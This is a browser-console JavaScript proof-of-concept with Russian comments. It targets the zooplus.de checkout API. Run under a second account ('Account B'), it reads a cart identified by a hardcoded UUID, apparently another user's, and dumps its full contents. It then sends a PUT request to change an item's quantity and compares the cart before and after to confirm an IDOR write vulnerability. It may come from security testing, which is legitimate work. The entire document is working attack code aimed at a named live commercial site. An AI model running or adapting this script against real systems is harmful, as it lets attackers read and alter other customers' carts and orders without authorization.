// Проверка что именно изменилось в корзине
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function() {
  console.log("[*] Checking what changed in cart...");
  
  // Получить корзину ДО
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart BEFORE:");
  console.log(`    Items: ${cartBefore.articles.length}`);
  console.log(`    Total: ${cartBefore.summary.grandTotal} EUR`);
  console.log(`    Articles:`, cartBefore.articles.map(a => `${a.id} (qty: ${a.quantity})`));
  console.log(`    Cart Autoshipment:`, JSON.stringify(cartBefore.cartAutoshipment));
  console.log(`    Full cart:`, JSON.stringify(cartBefore, null, 2));
  
  // Выполнить PUT запрос
  const articleId = cartBefore.articles[0]?.id;
  console.log(`\n[*] Modifying article ${articleId}...`);
  
  const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "PUT",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: articleId,
      quantity: 2
    })
  });
  
  const responseText = await response.text();
  console.log(`[+] PUT Response: HTTP ${response.status}`);
  console.log(`[+] Response: ${responseText.substring(0, 500)}`);
  
  // Подождать 3 секунды
  console.log(`\n[*] Waiting 3 seconds...`);
  await new Promise(resolve => setTimeout(resolve, 3000));
  
  // Получить корзину ПОСЛЕ
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log("\n[+] Cart AFTER:");
  console.log(`    Items: ${cartAfter.articles.length}`);
  console.log(`    Total: ${cartAfter.summary.grandTotal} EUR`);
  console.log(`    Articles:`, cartAfter.articles.map(a => `${a.id} (qty: ${a.quantity})`));
  console.log(`    Cart Autoshipment:`, JSON.stringify(cartAfter.cartAutoshipment));
  
  // Сравнить
  console.log("\n[*] Comparison:");
  console.log(`    Items: ${cartBefore.articles.length} → ${cartAfter.articles.length}`);
  console.log(`    Total: ${cartBefore.summary.grandTotal} → ${cartAfter.summary.grandTotal}`);
  
  // Проверить каждую статью
  cartBefore.articles.forEach((article, i) => {
    const afterArticle = cartAfter.articles[i];
    if (afterArticle) {
      console.log(`    Article ${article.id}: qty ${article.quantity} → ${afterArticle.quantity}`);
    }
  });
  
  // Проверить autoshipment
  if (JSON.stringify(cartBefore.cartAutoshipment) !== JSON.stringify(cartAfter.cartAutoshipment)) {
    console.log(`\n[!!!] Autoshipment changed!`);
    console.log(`    Before:`, JSON.stringify(cartBefore.cartAutoshipment));
    console.log(`    After:`, JSON.stringify(cartAfter.cartAutoshipment));
  }
  
  if (cartAfter.articles.length !== cartBefore.articles.length || 
      Math.abs(cartAfter.summary.grandTotal - cartBefore.summary.grandTotal) > 0.01) {
    console.log("\n[!!!] CRITICAL IDOR WRITE CONFIRMED!");
  } else {
    console.log("\n[!] Cart unchanged in API - but page shows change");
    console.log("[!] Possible reasons:");
    console.log("    1. UI update delay");
    console.log("    2. Different endpoint for UI updates");
    console.log("    3. Subscription settings changed (not quantity)");
  }
})();

